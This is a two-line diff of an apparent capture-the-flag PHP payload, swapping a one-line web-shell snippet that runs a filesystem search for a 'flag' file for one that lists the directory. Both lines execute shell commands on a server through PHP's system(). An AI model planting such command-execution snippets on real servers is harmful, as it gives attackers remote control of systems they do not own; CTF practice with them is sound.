@@ -1,1 +1,1 @@
-<?php system('find / -name flag'); ?>
+<?php system('ls'); ?>
